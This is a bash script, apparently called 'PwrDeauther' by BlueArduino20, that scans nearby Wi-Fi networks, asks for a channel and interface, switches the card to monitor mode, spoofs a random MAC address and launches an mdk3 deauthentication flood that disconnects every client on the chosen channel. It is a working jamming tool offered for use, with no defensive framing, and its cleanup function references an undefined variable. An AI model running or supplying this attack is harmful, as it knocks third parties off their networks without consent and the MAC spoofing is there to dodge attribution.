function coolexit()
{
clear
ifconfig $AD down
macchanger -p $AD
iwconfig $AD mode managed
ifconfig $AD up
clear
echo -e "\e[1;31mThanks for using this script"
echo -e "Made by BlueArduino20"
exit
}

echo -e "\e[1;31m    ____                ____                   __  __             "
echo -e "   / __ \\_      _______/ __ \\___  ____ ___  __/ /_/ /_  ___  _____"
echo -e "  / /_/ / | /| / / ___/ / / / _ \\/ __ \`/ / / / __/ __ \\/ _ \\/ ___/"
echo -e " / ____/| |/ |/ / /  / /_/ /  __/ /_/ / /_/ / /_/ / / /  __/ /    "
echo -e "/_/     |__/|__/_/  /_____/\\___/\\__,_/\\__,_/\\__/_/ /_/\\___/_/     "
echo " "
echo -e "\e[0;34m                 The MDK3 channel deauther script by BlueArduino20"
echo -e "\e[0;17m "
nmcli dev wifi
echo " "
echo -n -e "Choose the target channel: "
read CH
clear
ifconfig
echo -n -e "Choose your wireless interface: "
read WI
echo -e "\e[1;31mStarting the attack... If you want to stop it press CTRL+C."
ifconfig $WI down
iwconfig $WI mode monitor
macchanger -r $WI
ifconfig $WI up
mdk3 $WI d -c $CH &&
trap coolexit EXIT
